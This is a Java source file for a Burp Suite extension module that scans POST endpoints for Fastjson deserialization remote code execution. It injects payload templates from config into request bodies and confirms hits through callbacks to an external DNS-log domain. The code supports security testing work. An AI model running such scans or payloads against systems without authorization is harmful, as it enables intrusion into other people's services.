package burp.scan;

import burp.BurpExtender;
import burp.IBurpExtenderCallbacks;
import burp.IExtensionHelpers;
import burp.IHttpRequestResponse;
import burp.common.Common;
import burp.common.YamlReader;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;

public class FastJsonScan {
    static List<String> Features = new ArrayList<>();
    static List<String> scandone = new ArrayList<>();


    static String ceyeDomain = YamlReader.getInstance(BurpExtender.getCallbacks()).getString("dnsLog.domain");
    static List<String> FastJsonPayload = YamlReader.getInstance(BurpExtender.getCallbacks()).getStringList("scanModule.FastJsonScan.payload");
    
    public synchronized static List<Object> ScanMain(IHttpRequestResponse baseRequestResponse, IBurpExtenderCallbacks callbacks, IExtensionHelpers helpers, PrintWriter stdout) throws IOException, InterruptedException {
        Features.clear();
        URL url = helpers.analyzeRequest(baseRequestResponse).getUrl();
        String baseurl = url.getProtocol() + "://" + url.getAuthority();
        String methond = helpers.analyzeRequest(baseRequestResponse).getMethod();;
        if(!scandone.contains(Common.MD5(baseurl)) && methond.toLowerCase().equals("post") ){
            List<String> headers = helpers.analyzeRequest(baseRequestResponse).getHeaders();
            int bodyOffset = helpers.analyzeRequest(baseRequestResponse.getRequest()).getBodyOffset();
            String resp =new  String(baseRequestResponse.getRequest());
            String respbody = resp.substring(bodyOffset);
            stdout.println("fastjson 测试请求包内容为:" + respbody.trim().replace("\\r",""));
            List<String> pocs = JsonParmAddPoc(respbody.trim().replace("\\r",""));
            if(pocs != null){
                stdout.println("成功获取poc！");
                for(String poc:pocs){
                    List<Object> Success = new ArrayList<>();
                    byte[] request_bodys = poc.getBytes();
                    byte[] body = helpers.buildHttpMessage(setHeader(headers), request_bodys);
                    IHttpRequestResponse requestResponse = callbacks.makeHttpRequest(baseRequestResponse.getHttpService(), body);
                    String data = Common.ceyeResult();
                    for(String randString:Features){
                        if(data.contains(randString)){
                            stdout.println("Fastjson Rce find! 匹配randString值为: " + randString);
                            scandone.add(Common.MD5(baseurl));
                            Success.add(requestResponse);
                            Success.add(randString);
                            return Success;
                        }
                    }
                }
            }
        }else{
            stdout.println(baseurl + " Fastjson rce已扫描 or 非Post请求，跳过～");
        }
        return null;
    }


    public static List<String> setHeader(List<String> headers){
        List<String> header = headers;
        for(int i=1;i < headers.size();i++){
            if(headers.get(0).contains("Content-Type:")){
                header.set(i,"Content-Type: application/json");
                return header;
            }
        }
        return header;
    }

    public static List<String> JsonParmAddPoc(String body){
        List<String> payloads = Getpoc();
        if(body.startsWith("{") && body.endsWith("}")){
            return payloads;
        } else if (!body.startsWith("{") && body.contains("={") && !body.contains("&")) {
            List<String> pocs = new ArrayList<>();
            for(String payload:payloads){
                pocs.add(body.split("=")[0] + "=" + payload);
            }
            return pocs;
        }
        return null;
    }

    public static List<String> Getpoc(){
        List<String>  payloads = new ArrayList<>();
        for(String payload:FastJsonPayload){
            String randomString = Common.getRandomString(25);
            Features.add(randomString);
            payloads.add(payload.replace("dnslog-url",randomString+ "." + ceyeDomain));
        }
        return payloads;
    }
}
